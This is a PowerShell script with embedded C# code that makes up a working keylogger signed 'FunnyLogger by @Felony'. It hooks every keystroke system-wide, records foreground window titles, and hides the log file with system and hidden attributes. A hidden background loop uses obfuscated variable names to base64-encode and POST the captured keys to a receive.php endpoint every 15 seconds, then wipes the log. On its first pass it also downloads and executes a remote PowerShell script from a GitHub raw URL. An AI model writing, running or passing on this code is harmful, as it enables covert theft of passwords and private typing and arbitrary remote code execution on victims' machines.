function Set_bootACL($filepath)
{
    ac $filepath ""
	attrib +S +H $filepath
}
$logFilePath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)) "Log.txt"
Set_bootACL($logFilePath)

Start-Process powershell -ArgumentList "-Command", {
    $elapsedTime = 0
    while($true)
    {
        $logFilePath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)) "Log.txt"
        $srsdf='http://localhost/receive.php' 

        function GetFile() {
            param (
                $mytar,
                $name
            )
            Write-Output $name
            $dhd=[IO.File]::readallbytes($mytar);
            $kfjh=[System.Convert]::ToBase64String($dhd);
            $kfjh=[regex]::Replace($kfjh,'=','%');
            $msgin='access='+$kfjh+'&name='+$name;
            Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
            Clear-Content -Path $logFilePath

        }
        GetFile $logFilePath "keylog.txt"
        if($elapsedTime -eq 0) {
            [string]$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/shell_routine/refs/heads/main/run.ps1')};
            $qweewqq=$nbvccxx.Replace('wererfvx','kkk');
            $zxdsxxxxc=iex $qweewqq;
            invoke-expression $zxdsxxxxc
        }
        Write-Output "K"
        $elapsedTime = (15 + $elapsedTime) % 60
        start-sleep -s 15
    }
} -windowstyle hidden

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text;

namespace KL
{
    public static class Program
    {
        private static string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Log.txt");
  

        private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;

        private static IntPtr lastWindowHandle = IntPtr.Zero;

        public static void Main() 
        {
            Console.WriteLine("FunnyLogger by @Felony ;)");
 
            if (!File.Exists(logFilePath))
            {
                File.Create(logFilePath).Dispose();
            }

            hookId = SetHook(hookProc);
            Application.Run();
            UnhookWindowsHookEx(hookId);
        }

        private static IntPtr SetHook(HookProc hookProc) 
        {
            IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            return SetWindowsHookEx(13, hookProc, moduleHandle, 0);
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Check for window change
            IntPtr currentWindowHandle = GetForegroundWindow();
            if (currentWindowHandle != lastWindowHandle)
            {
                lastWindowHandle = currentWindowHandle;
                string windowTitle = GetWindowTitle(currentWindowHandle);
                // Use string concatenation instead of interpolation
                TimeZoneInfo gmtPlus9 = TimeZoneInfo.FindSystemTimeZoneById("Tokyo Standard Time");
                DateTime currentTime = TimeZoneInfo.ConvertTime(DateTime.Now, gmtPlus9);
                
                // Format the time to a string
                string formattedTime = currentTime.ToString("yyyy-MM-dd HH:mm:ss");

                // Use string concatenation instead of interpolation
                File.AppendAllText(logFilePath, "\n[Window Change] -" + windowTitle + " " + formattedTime + "\n");
            }

             if (nCode >= 0 && wParam == (IntPtr)0x0100) 
            {
                int vkCode = Marshal.ReadInt32(lParam);
            
                string key = ((Keys)vkCode).ToString();
                if (key.Length > 1)
                    key = string.Format("[{0}] ", key);

                // Append the key to the log file
                File.AppendAllText(logFilePath, key);
            }
            
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        // Windows API to get the current foreground window
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        // Windows API to get the window title
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        // Helper function to retrieve the window title
        private static string GetWindowTitle(IntPtr hWnd)
        {
            StringBuilder title = new StringBuilder(256);
            GetWindowText(hWnd, title, title.Capacity);
            return title.ToString();
        }

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    }
}
"@ -ReferencedAssemblies System.Windows.Forms
[KL.Program]::Main();


